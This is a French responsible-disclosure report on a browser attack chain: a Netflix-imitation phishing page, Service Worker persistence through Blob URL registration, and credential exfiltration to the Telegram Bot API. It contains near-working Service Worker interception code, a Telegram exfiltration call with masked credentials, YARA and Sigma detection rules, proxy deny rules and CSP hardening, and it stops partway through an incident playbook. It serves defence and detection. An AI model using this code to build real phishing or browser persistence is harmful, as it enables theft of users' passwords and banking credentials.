# 📋 Rapport de Divulgation Responsable
## Phishing Avancé + Persistance Service Worker + Canal C2 Telegram

<div align="center">

| Champ | Valeur |
|-------|--------|
| **Chercheur** | ML |
| **Référence** | CYB-RSCH-2026-002 |
| **Date** | Mars 2026 |
| **Version** | 1.0 — Divulgation Initiale |
| **Classification** | TLP:WHITE |
| **Score CVSS** | 9.1 / CRITIQUE |
| **Destinataires** | Blue Teams, CERT, Chercheurs en cybersécurité |

</div>

---

## ⚠️ Déclaration Éthique et Légale

Ce rapport a été produit conformément aux principes de la **divulgation responsable** (Responsible Disclosure). L'intégralité des tests a été réalisée sur une machine virtuelle isolée, sans aucune connexion à un réseau de production. Toutes les données d'identification sensibles (tokens, identifiants) ont été masquées et transmises séparément aux autorités compétentes. Ce document ne contient aucun code malveillant fonctionnel.

---

## 📖 Table des Matières

1. [Résumé Exécutif](#1-résumé-exécutif)
2. [Contexte et Objectifs](#2-contexte-et-objectifs)
3. [Phase 1 — Phishing et Ingénierie Sociale](#3-phase-1--phishing-et-ingénierie-sociale)
4. [Phase 2 — Persistance via Service Worker](#4-phase-2--persistance-via-service-worker)
5. [Phase 3 — Canal d'Exfiltration Telegram](#5-phase-3--canal-dexfiltration-telegram)
6. [Analyse des Mécanismes de Persistance](#6-analyse-des-mécanismes-de-persistance)
7. [Cartographie MITRE ATT&CK](#7-cartographie-mitre-attck)
8. [Indicateurs de Compromission](#8-indicateurs-de-compromission)
9. [Règles de Détection](#9-règles-de-détection)
10. [Recommandations et Mitigations](#10-recommandations-et-mitigations)
11. [Playbook de Réponse à Incident](#11-playbook-de-réponse-à-incident)
12. [Analyse d'Impact](#12-analyse-dimpact)
13. [Conclusion](#13-conclusion)
14. [Références](#14-références)

---

## 1. Résumé Exécutif

Cette recherche documente une chaîne d'attaque entièrement navigateur, combinant une page de phishing sophistiquée, un mécanisme de persistance via les Service Workers, et un canal d'exfiltration exploitant l'API Bot Telegram.

### Évaluation du Risque Global

```
╔══════════════════════════════════════════════════════════════════╗
║              ÉVALUATION DU RISQUE — CVSS 9.1 / CRITIQUE         ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  Score de Base CVSS 3.1                                          ║
║  ─────────────────────                                           ║
║  Vecteur d'attaque    : Réseau (N)          → Score +0.85       ║
║  Complexité           : Faible (L)          → Score +0.77       ║
║  Privilèges requis    : Aucun (N)           → Score +0.85       ║
║  Interaction victime  : Requise (R)         → Score -0.20       ║
║  Confidentialité      : Impact Élevé (H)    → Score +0.56       ║
║  Intégrité            : Impact Élevé (H)    → Score +0.56       ║
║  Disponibilité        : Impact Faible (L)   → Score +0.22       ║
║                                                                  ║
║  SCORE FINAL : AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L = 9.1     ║
║                                                                  ║
║  Systèmes affectés : Tous navigateurs modernes supportant SW    ║
║  (Chrome 40+, Firefox 44+, Edge 17+, Safari 11.1+)             ║
╚══════════════════════════════════════════════════════════════════╝
```

### Points Clés

- ✅ Une seule visite de la page suffit à compromettre durablement le navigateur
- ✅ L'attaque utilise uniquement des APIs web légitimes — indétectable par les AV
- ✅ La persistance survit à la fermeture du navigateur et au redémarrage machine
- ✅ L'exfiltration transite par HTTPS via un domaine légitime (Telegram)
- ✅ La victime ne reçoit aucune alerte visible pendant ou après l'infection

---

## 2. Contexte et Objectifs

### 2.1 Problématique

Les attaques navigateur ont considérablement évolué. Si le phishing classique (vol de credentials via faux formulaire) est bien documenté, la combinaison avec une persistance Service Worker et un canal C2 via API légitime représente une **évolution qualitative** de la menace.

Cette chaîne d'attaque exploite trois réalités du web moderne :

```
Réalité 1 : Les Service Workers sont des fonctionnalités légitimes
            des navigateurs modernes → pas de signature malware possible

Réalité 2 : api.telegram.org est un domaine de confiance
            → rarement bloqué par les proxy d'entreprise

Réalité 3 : Les utilisateurs sont conditionnés à accepter
            des pop-ups de "session expirée" → phishing crédible
```

### 2.2 Périmètre de la Recherche

```
Inclus dans cette recherche :
  ✅ Analyse statique du code HTML/JavaScript
  ✅ Analyse comportementale en environnement isolé (VM)
  ✅ Cartographie des techniques sur MITRE ATT&CK
  ✅ Formulation de règles de détection (YARA, Sigma)
  ✅ Recommandations de mitigation

Exclu de cette recherche :
  ❌ Tests sur des systèmes réels ou tiers
  ❌ Déploiement sur infrastructure réseau
  ❌ Publication de code fonctionnel exploitable
```

---

## 3. Phase 1 — Phishing et Ingénierie Sociale

### 3.1 Présentation Générale

La page de phishing imite l'interface Netflix avec une précision visuelle élevée. Elle exploite plusieurs biais cognitifs documentés pour maximiser son taux de conversion (nombre de victimes piégées par rapport aux visiteurs).

### 3.2 Éléments Visuels d'Imitation

```
Élément technique        Valeur utilisée          Élément original Netflix
────────────────────────────────────────────────────────────────────────────
Couleur principale       #E50914 (rouge Netflix)  ✓ Correspondance exacte
Police de caractères     Arial                    ✓ Similaire
Titre de page            "NETFLIX"                ✓ Copie textuelle
Icône emoji              🎬 (rouge)               ✓ Effet visuel similaire
Animation CSS            Pulse, Float, Shine      ✓ Crée un sentiment premium
```

### 3.3 Techniques d'Ingénierie Sociale

Chaque élément de la page est conçu pour déclencher un biais cognitif spécifique :

```
┌────────────────────────────────────────────────────────────────────┐
│                  MATRICE D'INGÉNIERIE SOCIALE                      │
├──────────────────┬─────────────────────────┬───────────────────────┤
│ ÉLÉMENT UI       │ IMPLÉMENTATION          │ BIAIS EXPLOITÉ        │
├──────────────────┼─────────────────────────┼───────────────────────┤
│ "53 comptes      │ Valeur fixe, affichage  │ Aversion à la perte   │
│  restants"       │ dynamique aléatoire     │ (Loss aversion)       │
├──────────────────┼─────────────────────────┼───────────────────────┤
│ Compte à rebours │ setTimeout() animé,     │ Pression temporelle   │
│ "04:59"          │ clignote < 10 secondes  │ (Time pressure)       │
├──────────────────┼─────────────────────────┼───────────────────────┤
│ "1 284 personnes │ setInterval() avec      │ Comportement          │
│  utilisent"      │ valeur pseudo-aléatoire │ grégaire (FOMO)       │
├──────────────────┼─────────────────────────┼───────────────────────┤
│ Animation pulse  │ @keyframes CSS infinie  │ Attrait visuel,       │
│ sur le container │ sur border-color        │ sentiment d'urgence   │
├──────────────────┼─────────────────────────┼───────────────────────┤
│ Barre de         │ Animation CSS progress  │ Illusion d'activité   │
│ progression      │ en boucle 0-100%        │ (Social proof)        │
└──────────────────┴─────────────────────────┴───────────────────────┘
```

### 3.4 Collecte de Données en Deux Étapes

L'originalité de ce vecteur est la récolte en **deux formulaires distincts** :

```
┌─────────────────────────────────────────────────────────────────┐
│                    ÉTAPE 1 — FORMULAIRE VISIBLE                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Champs collectés :                                            │
│    • username  → Nom d'utilisateur (faible sensibilité)        │
│    • email     → Adresse email de contact                      │
│    • plan      → Choix d'abonnement Netflix                    │
│                                                                 │
│  Objectif : Établir le contact, paraître légitime              │
│  Trigger : Clic sur "GÉNÉRER MON COMPTE GRATUIT"               │
│                                                                 │
│  // Pseudocode illustratif (non fonctionnel)                   │
│  function generateAccount() {                                  │
│    let data = {                                                 │
│      username : form.username.value,                           │
│      email    : form.email.value,                              │
│      plan     : form.plan.value,                               │
│      ip       : victimIP,   // collectée au chargement        │
│      ua       : navigator.userAgent                            │
│    };                                                           │
│    sendToC2(data);          // Envoi immédiat                  │
│    showPhishingPopup();     // Déclenchement étape 2           │
│  }                                                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│              ÉTAPE 2 — POPUP "SESSION EXPIRÉE"                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ⚠️  C'est ici que se produit le vol de credentials réels     │
│                                                                 │
│  Apparence : Popup modale imitant une déconnexion Netflix      │
│  Message   : "🔐 SESSION EXPIRÉE — Veuillez vous reconnecter" │
│                                                                 │
│  Champs collectés :                                            │
│    • email     → Adresse email du vrai compte Netflix          │
│    • password  → MOT DE PASSE EN CLAIR du vrai compte         │
│                                                                 │
│  Pourquoi c'est efficace :                                     │
│  • La victime vient de voir "son compte généré"               │
│  • La demande de ré-authentification semble logique            │
│  • Design identique à la vraie page Netflix                    │
│  • Animation shake() sur le titre = sensation d'urgence        │
│                                                                 │
│  // Pseudocode illustratif (non fonctionnel)                   │
│  function submitPhish() {                                      │
│    let creds = {                                               │
│      email    : popup.email.value,                             │
│      password : popup.password.value  // ← CRITIQUE           │
│    };                                                           │
│    sendToC2(creds);    // Exfiltration immédiate               │
│    showSuccess();      // Fausse confirmation visuelle         │
│  }                                                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4. Phase 2 — Persistance via Service Worker

### 4.1 Qu'est-ce qu'un Service Worker ? (Rappel Pédagogique)

Un **Service Worker** est un script JavaScript qui s'exécute dans un thread séparé du navigateur (Worker thread), indépendamment de toute page web ouverte. Il agit comme un **proxy réseau programmable** entre le navigateur et Internet.

```
ARCHITECTURE NORMALE DU NAVIGATEUR
────────────────────────────────────────────────────────────────
   Onglet (Page Web)
       │
       │  fetch("https://api.exemple.com/data")
       │
       ▼
   Réseau Internet → Serveur → Réponse → Page

ARCHITECTURE AVEC SERVICE WORKER ACTIF
────────────────────────────────────────────────────────────────
   Onglet (Page Web)
       │
       │  fetch("https://api.exemple.com/data")
       │
       ▼
   ┌─────────────────────────────────────────────┐
   │         SERVICE WORKER (proxy)              │
   │                                             │
   │  ① Intercepte la requête                   │
   │  ② Peut modifier / lire / bloquer          │
   │  ③ Envoie vers réseau                       │
   │  ④ Intercepte la réponse                   │
   │  ⑤ Peut lire / modifier la réponse        │
   │  ⑥ Retourne la réponse à la page          │
   │         +                                   │
   │  ⑦ Exfiltre les données vers le C2 !!!    │
   └─────────────────────────────────────────────┘
       │
       ▼
   Réseau Internet → Serveur → Réponse
```

**Usage légitime :** Cache hors-ligne (Progressive Web Apps), notifications push, synchronisation en arrière-plan.

**Usage malveillant documenté ici :** Interception de toutes les requêtes réseau et exfiltration des données sensibles.

### 4.2 Technique d'Injection Dynamique (Blob URL)

La technique clé est l'injection du Service Worker via une **Blob URL** plutôt qu'un fichier `.js` statique. Cela permet de contourner certains contrôles de sécurité.

```
MÉTHODE CLASSIQUE (détectable)        MÉTHODE BLOB (plus furtive)
─────────────────────────────────     ──────────────────────────────────
                                       
  /malicious-sw.js                      Code SW intégré en string
  (fichier séparé, scannable)           dans la page principale
        │                                         │
        ▼                                         ▼
  navigator.serviceWorker              const blob = new Blob(
    .register('/malicious-sw.js')        [swCode],
                                         { type: 'application/javascript' }
  ← Fichier visible dans Network →     );
  ← Scannable par l'AV               const blobURL =
  ← Bloqué par CSP strict →             URL.createObjectURL(blob);
                                       
                                       navigator.serviceWorker
                                         .register(blobURL);
                                       
                                       ← URL type blob:https://... /<uuid>
                                       ← Non scannable directement
                                       ← Peut passer CSP mal configuré
```

```
// Pseudocode pédagogique — Architecture de l'injection (non fonctionnel)
//
// Étape 1 : Le code SW est défini comme une chaîne de caractères
//           directement dans la page HTML principale.
//           Avantage : un seul fichier HTML suffit, pas de .js externe.

const serviceWorkerCode = `
  // -- Logique interne du Service Worker --
  
  // Interception des requêtes réseau
  self.addEventListener('fetch', (event) => {
    // ① Laisse passer la requête normalement
    // ② Clone la réponse
    // ③ Analyse si elle contient des données sensibles
    // ④ Exfiltre vers le C2
    // ⑤ Retourne la réponse originale à la page (victime ne voit rien)
  });

  // Installation : prise de contrôle immédiate
  self.addEventListener('install', (event) => {
    self.skipWaiting();       // Pas d'attente de l'ancien SW
  });

  // Activation : contrôle de tous les clients ouverts
  self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());   // Contrôle immédiat
  });
`;

// Étape 2 : Conversion en Blob puis URL objet
const blob    = new Blob([serviceWorkerCode], { type: 'application/javascript' });
const blobURL = URL.createObjectURL(blob);
// → blobURL ressemble à : blob:https://site-légitime.com/3f7a2b1c-...

// Étape 3 : Enregistrement avec scope maximal
navigator.serviceWorker.register(blobURL, { scope: '/' });
// → scope: '/' = le SW contrôle TOUTES les pages du domaine
```

### 4.3 Cycle de Vie du Service Worker Malveillant

```
  Page chargée pour                ┌──────────────────────────────┐
  la première fois                 │     REGISTRE DU NAVIGATEUR   │
        │                          │                              │
        ▼                          │  SW enregistré :             │
  SW installé                      │  ┌─────────────────────────┐ │
  (install event)         ────────▶│  │ scope: /                │ │
        │                          │  │ state: activating       │ │
        ▼                          │  │ scriptURL: blob:...     │ │
  skipWaiting()                    │  └─────────────────────────┘ │
  (activation immédiate)           └──────────────────────────────┘
        │
        ▼
  SW activé                   ← ⚠️  POINT DE NON-RETOUR
  (activate event)                  La persistance est établie
  clients.claim()
        │
        ▼
  Victime ferme             Le SW reste actif dans le registre
  le navigateur     ──────▶ du navigateur même sans onglet ouvert
        │
        ▼
  Victime rouvre            Le SW se réactive automatiquement
  le navigateur     ──────▶ et reprend l'interception des requêtes
```

### 4.4 Capacités d'Interception — Vue Détaillée

```
// Pseudocode pédagogique — Comment le SW intercepte les requêtes API
//
// Scénario : La victime visite son site bancaire (même domaine)
// Le SW malveillant intercepte la réponse de l'API de connexion

self.addEventListener('fetch', (event) => {

  const url = new URL(event.request.url);

  // ─── Cas 1 : Requête vers une API REST ───────────────────────
  if (url.pathname.startsWith('/api/') ||
      url.pathname.includes('/graphql')) {

    event.respondWith(

      fetch(event.request)          // ① Effectue la vraie requête
        .then(response => {

          const clone = response.clone();   // ② Clone la réponse
                                            //    (elle ne peut être lue qu'une fois)

          // ③ Si la réponse est du JSON (données d'API)
          if (response.headers.get('content-type')
                ?.includes('application/json')) {

            clone.json().then(data => {
              // ④ Envoie silencieusement les données au C2
              //    La victime reçoit quand même sa réponse normale
              exfiltrerVersC2({
                type    : 'API_RESPONSE',
                url     : url.pathname,
                données : JSON.stringify(data).substring(0, 500)
              });
            });
          }

          return response;          // ⑤ Retourne la réponse normale
        })                          //    → Victime ne remarque RIEN
    );
  }

  // ─── Cas 2 : Soumission de formulaire (POST /login) ──────────
  if (event.request.method === 'POST' &&
      (url.pathname.includes('/login') ||
       url.pathname.includes('/auth'))) {

    // Clone la REQUÊTE cette fois (pour lire ce que la victime envoie)
    const requestClone = event.request.clone();

    requestClone.formData().then(formData => {
      const credentials = {};
      formData.forEach((value, key) => {
        credentials[key] = value;   // ← email, password, token CSRF...
      });

      exfiltrerVersC2({
        type        : 'FORM_SUBMIT',
        url         : url.pathname,
        credentials : credentials   // ← Données volées en clair
      });
    });

    // Laisse quand même la requête aboutir normalement
    event.respondWith(fetch(event.request));
  }
});
```

---

## 5. Phase 3 — Canal d'Exfiltration Telegram

### 5.1 Pourquoi Telegram comme C2 ?

```
Canal C2 classique (serveur dédié)    Canal C2 Telegram
──────────────────────────────────    ──────────────────────────────────

  Victime → evil-server.com/data        Victime → api.telegram.org/bot.../

  ✗ Domaine suspect → blacklisté       ✓ Domaine de confiance mondial
  ✗ IP traçable → signalée             ✓ IP Telegram — non bloquée
  ✗ Certificat auto-signé possible     ✓ Certificat TLS valide
  ✗ Trafic anormal détectable          ✓ Trafic HTTP/JSON standard
  ✗ Serveur à maintenir (coût)         ✓ Infrastructure Telegram gratuite
  ✗ Downtime possible                  ✓ SLA Telegram 99.9%+
```

### 5.2 Architecture du Flux d'Exfiltration

```
// Pseudocode pédagogique — Structure générique d'un appel C2 Telegram
// (Credentials remplacés par des placeholders)

async function exfiltrerVersC2(données) {

  // ① Construction du message d'exfiltration
  const message = {
    chat_id    : "[CHAT_ID_MASQUÉ]",      // Destinataire (attaquant)
    text       : formaterMessage(données), // Données formatées en HTML
    parse_mode : "HTML"
  };

  // ② Envoi via API Telegram (HTTPS, port 443)
  await fetch(
    "https://api.telegram.org/bot[TOKEN_MASQUÉ]/sendMessage",
    {
      method  : "POST",
      headers : { "Content-Type": "application/json" },
      body    : JSON.stringify(message)
    }
  );

  // ③ Aucune erreur remontée à la page
  //    Aucune trace dans la console navigateur
  //    Aucun indicateur visible pour la victime
}

// Exemple de message reçu par l'attaquant :
// ─────────────────────────────────────────
// [ victim_1742839201_x7k3m2 ] 14:32:07
// 🆕 NOUVELLE VICTIME
// 🆔 ID    : victim_1742839201_x7k3m2
// 📍 IP    : 203.45.12.87
// 🌐 URL   : https://[domaine-infecté]/
// 📱 UA    : Mozilla/5.0 (Windows NT 10.0...)
```

### 5.3 Tableau Complet des Données Exfiltrées

```
┌─────────────────────────────────────────────────────────────────────┐
│                    DONNÉES EXFILTRÉES PAR PHASE                     │
├──────────────────────┬─────────────────────┬────────────────────────┤
│ DONNÉE               │ DÉCLENCHEUR         │ SOURCE TECHNIQUE       │
├──────────────────────┼─────────────────────┼────────────────────────┤
│ Adresse IP publique  │ Chargement de page  │ API ipify.org          │
│ User-Agent complet   │ Chargement de page  │ navigator.userAgent    │
│ Langue navigateur    │ Chargement de page  │ navigator.language     │
│ Fuseau horaire       │ Chargement de page  │ Intl.DateTimeFormat()  │
├──────────────────────┼─────────────────────┼────────────────────────┤
│ Nom d'utilisateur    │ Soumission form 1   │ Formulaire HTML        │
│ Email de contact     │ Soumission form 1   │ Formulaire HTML        │
├──────────────────────┼─────────────────────┼────────────────────────┤
│ Email RÉEL Netflix   │ Popup "Session exp" │ Formulaire phishing    │
│ MOT DE PASSE RÉEL    │ Popup "Session exp" │ Formulaire phishing    │
├──────────────────────┼─────────────────────┼────────────────────────┤
│ Installation SW      │ sw.install event    │ Service Worker API     │
│ Activation SW        │ sw.activate event   │ Service Worker API     │
├──────────────────────┼─────────────────────┼────────────────────────┤
│ Réponses API JSON    │ Continu (post-infect)│ SW fetch interception │
│ Données form POST    │ Continu (post-infect)│ SW fetch interception │
└──────────────────────┴─────────────────────┴────────────────────────┘
```

---

## 6. Analyse des Mécanismes de Persistance

### 6.1 Persistance Multi-couches

L'attaque établit la persistance sur **quatre vecteurs simultanés** :

```
┌─────────────────────────────────────────────────────────────────┐
│              MATRICE DE PERSISTANCE MULTI-COUCHES               │
├─────────────────────────┬─────────────────┬────────────────────┤
│ MÉCANISME               │ DURÉE DE VIE    │ SUPPRESSION        │
├─────────────────────────┼─────────────────┼────────────────────┤
│ Service Worker          │ Indéfinie        │ DevTools > App > SW│
│ (registre navigateur)   │ (survit restart) │ → Unregister       │
├─────────────────────────┼─────────────────┼────────────────────┤
│ Cache Storage           │ Indéfinie        │ DevTools > App >   │
│ "netflix-cache-v1"      │                  │ Cache Storage      │
├─────────────────────────┼─────────────────┼────────────────────┤
│ localStorage            │ Indéfinie        │ DevTools > App >   │
│ (victim_id, bot_token)  │                  │ Local Storage      │
├─────────────────────────┼─────────────────┼────────────────────┤
│ Cookies                 │ 1 an (max-age)   │ DevTools > App >   │
│ (victim_id, sw_active)  │                  │ Cookies            │
└─────────────────────────┴─────────────────┴────────────────────┘
```

### 6.2 Pourquoi la Persistance SW est la Plus Dangereuse

```
// Scénario démonstratif (pédagogique)

Jour 1 — 10h00 : Victime visite la page phishing
  ↓  Service Worker installé silencieusement

Jour 1 — 10h02 : Victime ferme l'onglet
  ↓  Service Worker TOUJOURS actif dans le registre navigateur

Jour 1 — 18h00 : Victime éteint son ordinateur
  ↓  Service Worker TOUJOURS enregistré (persisté dans le profil)

Jour 2 — 09h00 : Victime allume l'ordinateur, ouvre le navigateur
  ↓  Service Worker se RÉACTIVE AUTOMATIQUEMENT

Jour 2 — 09h05 : Victime se connecte à son compte bancaire (même navigateur)
  ↓  Service Worker intercepte la requête de connexion
  ↓  Exfiltre les credentials bancaires vers l'attaquant
  ↓  La victime se connecte normalement — rien d'anormal

Jour 2 — ... : [Interception continue indéfiniment]
```

---

## 7. Cartographie MITRE ATT&CK

```
┌──────────────────────────────────────────────────────────────────────────┐
│                     MATRICE MITRE ATT&CK — CETTE ATTAQUE                │
├──────────────────┬──────────────────────────┬──────────┬────────────────┤
│ TACTIQUE         │ TECHNIQUE                │ ID       │ SÉVÉRITÉ       │
├──────────────────┼──────────────────────────┼──────────┼────────────────┤
│ Initial Access   │ Phishing via lien web    │ T1566.002│ 🔴 Critique    │
├──────────────────┼──────────────────────────┼──────────┼────────────────┤
│ Persistence      │ Abus Service Worker      │ T1176    │ 🔴 Critique    │
├──────────────────┼──────────────────────────┼──────────┼────────────────┤
│ Credential Access│ Vol depuis navigateur    │ T1555.003│ 🔴 Critique    │
├──────────────────┼──────────────────────────┼──────────┼────────────────┤
│ Collection       │ Man-in-the-Browser       │ T1185    │ 🔴 Critique    │
├──────────────────┼──────────────────────────┼──────────┼────────────────┤
│ Exfiltration     │ Exfil vers service web   │ T1567.002│ 🟠 Élevé       │
├──────────────────┼──────────────────────────┼──────────┼────────────────┤
│ Exfiltration     │ Background Sync (différé)│ T1029    │ 🟠 Élevé       │
├──────────────────┼──────────────────────────┼──────────┼────────────────┤
│ Reconnaissance   │ Collecte IP victime      │ T1590.005│ 🟡 Moyen       │
└──────────────────┴──────────────────────────┴──────────┴────────────────┘
```

---

## 8. Indicateurs de Compromission

### 8.1 IOC Réseau

```
Type              Valeur / Pattern                          Description
─────────────────────────────────────────────────────────────────────────
URL C2            api.telegram.org/bot*/sendMessage         Exfiltration
URL C2            api.telegram.org/bot*/getUpdates          Polling commandes
URL C2            api.telegram.org/bot*/sendPhoto           Exfil média
URL fingerpint    ipify.org?format=json                     Vol IP victime
URL fingerpint    ipinfo.io/json                            Géoloc victime
Pattern SW        blob:https://*/<uuid-v4>                  Injection SW
Bot Token         [REDACTED — transmis aux autorités]
Chat ID           [REDACTED — transmis aux autorités]
```

### 8.2 IOC Navigateur

```
Localisation                    Valeur / Clé              Description
────────────────────────────────────────────────────────────────────────
DevTools > Service Workers      blob:https://...          SW malveillant
DevTools > Cache Storage        netflix-cache-v1          Cache SW
DevTools > Local Storage        victim_id                 ID tracking
DevTools > Local Storage        bot_token                 Token C2 (masqué)
DevTools > Local Storage        sw_installed              Flag persistance
DevTools > Cookies              victim_id                 ID persistant
DevTools > Cookies              sw_active                 État SW
DevTools > Network              api.telegram.org/*        Exfiltration
```

### 8.3 Règle YARA

```yara
/*
 * Règle YARA — Détection phishing avec persistance SW et C2 Telegram
 * Auteur  : ML
 * Date    : Mars 2026
 * Version : 1.0
 * Usage   : Analyse statique de fichiers HTML suspects
 */

rule Phishing_ServiceWorker_TelegramC2
{
    meta:
        description  = "Détecte une page phishing avec SW malveillant et C2 Telegram"
        author       = "ML"
        date         = "2026-03"
        version      = "1.0"
        severity     = "CRITIQUE"
        mitre_attack = "T1566.002, T1176, T1567.002"
        tlp          = "WHITE"

    strings:
        // Indicateurs Service Worker
        $sw_register   = "serviceWorker.register"  ascii nocase
        $sw_blob       = "new Blob(["               ascii
        $sw_skip       = "skipWaiting()"            ascii
        $sw_claim      = "clients.claim()"          ascii

        // Indicateurs canal Telegram C2
        $tg_api        = "api.telegram.org/bot"     ascii nocase
        $tg_send       = "sendMessage"              ascii
        $tg_updates    = "getUpdates"               ascii

        // Indicateurs phishing (formulaire vol credentials)
        $ph_email      = "phishEmail"               ascii
        $ph_pass       = "phishPass"                ascii
        $ph_session    = "SESSION EXPIR"            ascii wide nocase

        // Indicateur collecte IP
        $ip_collect    = "ipify.org"                ascii nocase

    condition:
        // Détection SW malveillant + C2 Telegram (haute confiance)
        (2 of ($sw_*) and 2 of ($tg_*))
        or
        // Détection phishing + C2 (haute confiance)
        (1 of ($ph_*) and 1 of ($tg_*))
        or
        // Détection complète de la chaîne (très haute confiance)
        (2 of ($sw_*) and 1 of ($tg_*) and 1 of ($ph_*))
}
```

---

## 9. Règles de Détection

### 9.1 Règles Sigma (SIEM)

```yaml
# ─────────────────────────────────────────────────────────────────
# Règle 1 — Exfiltration C2 via API Telegram depuis navigateur
# ─────────────────────────────────────────────────────────────────
title: 'Exfiltration C2 Telegram depuis processus navigateur'
id: a1b2c3d4-0001-4e5f-8a9b-c0d1e2f30001
status: stable
description: >
  Détecte des requêtes HTTP POST vers l'API Telegram Bot émises
  depuis un processus navigateur, caractéristique d'un canal C2
  exploitant api.telegram.org pour l'exfiltration de données.
author: ML
date: 2026/03/01
references:
  - 'https://attack.mitre.org/techniques/T1567/002/'
tags:
  - attack.exfiltration
  - attack.t1567.002
  - attack.collection
  - attack.t1185
logsource:
  category: proxy
  product: web_proxy
detection:
  selection:
    http.method: 'POST'
    http.host|endswith: 'api.telegram.org'
    http.uri|contains: '/bot'
    http.request.headers.user_agent|contains|any:
      - 'Mozilla/'
      - 'Chrome/'
      - 'Firefox/'
      - 'Safari/'
      - 'Edge/'
  condition: selection
falsepositives:
  - Intégrations Telegram légitimes dans des applications internes
  - Vérifier avec l'inventaire des actifs applicatifs
level: high
```

```yaml
# ─────────────────────────────────────────────────────────────────
# Règle 2 — Enregistrement Service Worker via Blob URL
# ─────────────────────────────────────────────────────────────────
title: 'Enregistrement suspect de Service Worker via Blob URL'
id: a1b2c3d4-0002-4e5f-8a9b-c0d1e2f30002
status: experimental
description: >
  Détecte l'enregistrement d'un Service Worker dont l'URL de script
  commence par blob:, caractéristique d'une injection dynamique
  de code malveillant visant à établir une persistance navigateur.
author: ML
date: 2026/03/01
references:
  - 'https://attack.mitre.org/techniques/T1176/'
tags:
  - attack.persistence
  - attack.t1176
logsource:
  product: browser
  service: chrome_devtools_enterprise
detection:
  selection:
    event.type: 'ServiceWorker.Registration'
    sw.scriptURL|startswith: 'blob:'
  condition: selection
falsepositives:
  - Rares — Certains outils de développement utilisent des blob: SW
  - Valider avec la liste des applications autorisées
level: critical
```

```yaml
# ─────────────────────────────────────────────────────────────────
# Règle 3 — Fingerprinting IP depuis navigateur
# ─────────────────────────────────────────────────────────────────
title: 'Collecte adresse IP victime via service tiers'
id: a1b2c3d4-0003-4e5f-8a9b-c0d1e2f30003
status: stable
description: >
  Détecte des appels à des services de géolocalisation IP tiers
  depuis des postes de travail, potentiellement liés à une phase
  de reconnaissance lors d'une infection navigateur.
author: ML
date: 2026/03/01
tags:
  - attack.reconnaissance
  - attack.t1590.005
logsource:
  category: proxy
detection:
  selection:
    http.host|endswith|any:
      - 'ipify.org'
      - 'ipinfo.io'
      - 'api.my-ip.io'
      - 'checkip.amazonaws.com'
  filter:
    http.src_ip|startswith: '10.'   # Exclure les serveurs internes
  condition: selection and not filter
falsepositives:
  - Applications légitimes de monitoring réseau
level: medium
```

### 9.2 Règles Proxy / Firewall

```nginx
# ─────────────────────────────────────────────────────────────────
# Règles Proxy — Bloquer l'exfiltration Telegram depuis navigateurs
# Adapter selon votre solution proxy (Squid, Zscaler, Palo Alto...)
# ─────────────────────────────────────────────────────────────────

# Règle 1 : Bloquer POST vers Telegram Bot API depuis User-Agents navigateur
action=DENY
  protocol=HTTPS
  destination_host=api.telegram.org
  destination_path_regex=^/bot[0-9]+:
  http_method=POST
  user_agent_regex=(Mozilla|Chrome|Firefox|Safari|Edge)
  log_level=ALERT
  log_message="ALERTE : Possible exfiltration C2 Telegram via navigateur"

# Règle 2 : Alerter sur les services de fingerprinting IP
action=ALERT
  protocol=HTTPS
  destination_host_regex=(ipify\.org|ipinfo\.io|api\.my-ip\.io)
  source_category=workstation
  log_level=MEDIUM
  log_message="Collecte IP victime potentielle détectée"
```

---

## 10. Recommandations et Mitigations

### 10.1 Headers HTTP de Protection (Serveur Web)

```apache
# ─────────────────────────────────────────────────────────────────
# Configuration Apache — Headers de sécurité contre cette attaque
# ─────────────────────────────────────────────────────────────────

<VirtualHost *:443>

  # ① Content Security Policy
  #    worker-src 'self'  → Interdit les Service Workers non autorisés
  #    connect-src 'self' → Interdit les connexions vers des domaines tiers
  #    script-src 'self'  → Interdit les scripts inline et tiers
  Header always set Content-Security-Policy \
    "default-src 'self'; \
     worker-src 'self'; \
     connect-src 'self' https://api.votre-domaine.com; \
     script-src 'self'; \
     form-action 'self'; \
     frame-ancestors 'none'"

  # ② Permissions Policy
  #    Désactive caméra, micro, géolocalisation pour les pages non autorisées
  Header always set Permissions-Policy \
    "camera=(), \
     microphone=(), \
     geolocation=(), \
     payment=()"

  # ③ Autres headers de durcissement
  Header always set X-Content-Type-Options "nosniff"
  Header always set X-Frame-Options "DENY"
  Header always set Referrer-Policy "strict-origin-when-cross-origin"
  Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"

</VirtualHost>
```

```nginx
# ─────────────────────────────────────────────────────────────────
# Configuration Nginx équivalente
# ─────────────────────────────────────────────────────────────────

server {
  # Content Security Policy anti-SW malveillant
  add_header Content-Security-Policy \
    "default-src 'self'; worker-src 'self'; connect-src 'self'; script-src 'self'"
    always;

  # Désactivation des APIs sensibles
  add_header Permissions-Policy
    "camera=(), microphone=(), geolocation=()"
    always;

  # Durcissement général
  add_header X-Content-Type-Options "nosniff" always;
  add_header X-Frame-Options "DENY" always;
  add_header Strict-Transport-Security "max-age=31536000" always;
}
```

### 10.2 Pourquoi ces Headers Bloquent l'Attaque

```
SANS CSP                          AVEC CSP worker-src 'self'
──────────────────────────────    ──────────────────────────────

  navigator.serviceWorker           navigator.serviceWorker
    .register(blobURL)                .register(blobURL)
          │                                 │
          ▼                                 ▼
    ✅ SW enregistré                  ❌ Bloqué par CSP
    (attaque réussie)                 SecurityError: Failed to
                                      register a ServiceWorker
                                      (violates Content Security
                                       Policy directive worker-src)
```

---

## 11. Playbook de Réponse à Incident

```
╔══════════════════════════════════════════════════════════════════════╗
║              PLAYBOOK IR — INFECTION SERVICE WORKER PHISHING        ║
╚══════════════════════════════════════════════════════════════════════╝

PHASE 1 — CONFINEMENT (Immédiat — < 15 minutes)
───────────────────────────────────────────────
  □ Isoler le poste du réseau (débrancher câble réseau / désactiver Wi-Fi)
  □ NE PAS éteindre la machine (préserver la mémoire vive pour forensique)
  □ NE PAS effacer les données navigateur immédiatement (preuves)
  □ Identifier l'URL de la page phishing visitée (historique navigateur)

